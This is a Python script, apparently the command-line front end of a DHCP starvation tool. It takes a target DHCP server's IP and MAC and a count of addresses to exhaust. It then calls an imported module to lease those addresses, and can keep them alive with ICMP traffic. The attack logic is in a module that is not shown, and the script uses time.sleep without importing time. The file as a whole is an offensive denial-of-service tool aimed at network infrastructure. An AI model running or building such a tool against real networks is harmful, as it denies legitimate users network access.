import dhcp
import sys
import argparse
from scapy.all import getmacbyip, conf
import logging
#TODO
# sleep time of keep alive

logger = logging.getLogger()
#shutting the 1 packet sent msgs
conf.verb = 0

def handle_args(args):
    # Create the parser
    parser = argparse.ArgumentParser()

    # Add the -d/--debug option
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')

    # Add other arguments
    parser.add_argument('--server_ip', required=True, help='Required IP address of the server')
    parser.add_argument('--ips_to_starve', type=int, required=True,help='Required Amount of IPs to occupy')
    parser.add_argument('--server_mac', help='MAC address of the server')
    parser.add_argument('--sniff_interface', required=False, help=f"Network interface to sniff on. Will use {conf.iface} (conf.iface) in case none provided")    
    parser.add_argument('--interface', required=False, help=f"Network interface to use. Will use {conf.iface} (conf.iface) in case none provided")
    parser.add_argument('--keep_alive_while_starving', action='store_true', required=False, help=f"Keep starved IP's alive while starvation")
    parser.add_argument('--keep_alive', action='store_true',required=False, help=f"Keep starved IP's alive after starvation")
    parser.add_argument('--log_file', help="where to store logs will print to stdout if none provided", default="")
    parser.add_argument('--log_level',\
            help=f"""Options :
                        debug = {logging.DEBUG}
                        info = {logging.INFO}
                        warning = {logging.WARNING}
                        error = {logging.ERROR}
                        critical = {logging.CRITICAL}
                        will use info if none provided""", default=20, type=int)
    parser.add_argument('--keep_alive_sleep_time', help="amount of time between a wave of icmps for keeping alive", default=0, type = int)
    args = parser.parse_args()
    args.ttl = 5
    return args


dhcp.args=handle_args(sys.argv)
logging.basicConfig(filename=dhcp.args.log_file, level=dhcp.args.log_level)
logger.debug(dhcp.args)
if dhcp.args.server_mac is None:
    dhcp.args.server_mac = getmacbyip(dhcp.args.server_ip)
    if dhcp.args.server_mac is None:
        logger.error("Can't get the server mac")
        exit(1)

if dhcp.args.interface is not None : conf.iface = dhcp.args.interface
if dhcp.args.sniff_interface is None : dhcp.args.sniff_interface = conf.iface


occupied_ips = dhcp.starve_ips(dhcp.args.server_ip, dhcp.args.server_mac, conf.iface, dhcp.args.ips_to_starve)
logger.info('Got these IPs')
for ip in occupied_ips:
    logger.info(ip)
if(len(occupied_ips) == 0):
    logger.info('[-]No ip occupied')
    exit(1)


if dhcp.args.keep_alive :
    while(True):
        dhcp.keep_ips_alive_icmp(occupied_ips, dhcp.args.server_ip, dhcp.args.server_mac)
        time.sleep(dhcp.args.keep_alive_sleep_time)
